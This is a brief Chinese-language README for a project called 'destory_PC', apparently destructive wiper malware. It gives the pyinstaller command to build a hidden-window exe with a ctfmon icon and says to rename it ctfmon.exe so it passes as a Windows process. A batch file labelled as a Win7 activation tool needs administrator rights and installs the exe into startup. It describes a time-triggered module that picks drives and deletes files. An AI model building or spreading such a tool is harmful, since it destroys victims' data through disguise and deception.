# destory_PC

使用pyinstaller打包成exe 即可


考虑到兼容性，请使用x86 python2环境安装pyinstaller打包

需要导入扩展包括：
import os

import win32api

from random import randint

import time

命令如下：

pyinstaller -w --onefile --icon="ctfmon_0000.ico" main.py

完成后会生成main.exe 请修改成ctfmon.exe

win7激活.bat 需要管理员权限运行

自动将ctfmon.exe复制到win系统启动项

开机启动


程序说明：

main.py  根据时间条件启动程序

auto_del.py 自动挑选盘符开始删除文件
删除一定次数退出，如果没有找到合适条件，随机挑选盘符 再次扫描
